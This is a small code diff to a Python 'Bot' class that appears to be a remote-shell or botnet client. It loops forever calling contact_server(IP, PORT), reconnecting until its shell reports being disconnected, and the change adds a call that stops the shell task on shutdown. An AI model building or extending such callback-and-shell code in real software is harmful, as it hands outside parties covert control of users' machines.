@@ -39,6 +39,7 @@ class Bot(object):
 
  def shutdown(self):
   try: 
+   self.shell.task.stop()
    self.conn.shutdown(socket.SHUT_RDWR)
    self.conn.close()
   except:pass
@@ -71,12 +72,12 @@ class Bot(object):
 
 if  __name__ == '__main__':
  home = getcwd()
+ 
  while True:
   chdir(home)
   bot = Bot(home)
   bot.contact_server(IP, PORT)
   bot.shutdown()
-
   if bot.shell:
    if bot.shell.disconnected:
     break 
